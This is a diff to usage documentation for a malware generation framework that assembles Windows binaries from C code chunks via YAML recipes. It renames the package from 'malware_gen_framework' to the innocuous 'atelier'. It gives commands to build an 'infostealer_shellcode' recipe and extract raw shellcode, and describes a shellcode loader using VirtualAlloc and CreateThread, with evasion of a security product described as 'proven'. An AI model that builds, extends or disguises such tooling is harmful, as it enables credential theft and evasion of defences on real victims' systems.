@@ -105,7 +105,7 @@ Each binary is assembled from small, independent C "chunks" combined via a YAML 
 ## 3. Project Layout
 
 ```
-malware_gen_framework/
+atelier/
 ├── templates/chunks/              # THE CHUNK LIBRARY
 │   ├── assembler.py               # The assembler script
 │   ├── recipes/                   # YAML recipe definitions (50 total)
@@ -804,14 +804,14 @@ zig cc -target x86_64-windows-gnu -Wl,--subsystem,windows -o output.exe output.c
 | Resources | MinGW windres | MinGW windres (Zig links the .o) |
 | CS evasion status | Proven | Untested |
 
-**CLI**: `python3 -m malware_gen_framework chunk --recipe <name> --compile --compiler zig`
+**CLI**: `python3 -m atelier chunk --recipe <name> --compile --compiler zig`
 
 ### Shellcode extraction
 
 After compilation, extract raw PIC shellcode from the .text section:
 
 ```bash
-python3 -m malware_gen_framework chunk --recipe infostealer_shellcode --compile --format shellcode
+python3 -m atelier chunk --recipe infostealer_shellcode --compile --format shellcode
 ```
 
 This produces `payload.bin` (raw .text bytes) alongside `payload.exe`. Use `arch/shellcode_entry` with `api_resolve/peb_walk` for PIC-compatible recipes. The loader template (`arch/shellcode_loader_virtualalloc`) embeds shellcode bytes via `{{SHELLCODE_BYTES}}` and executes with VirtualAlloc + CreateThread (W^X).
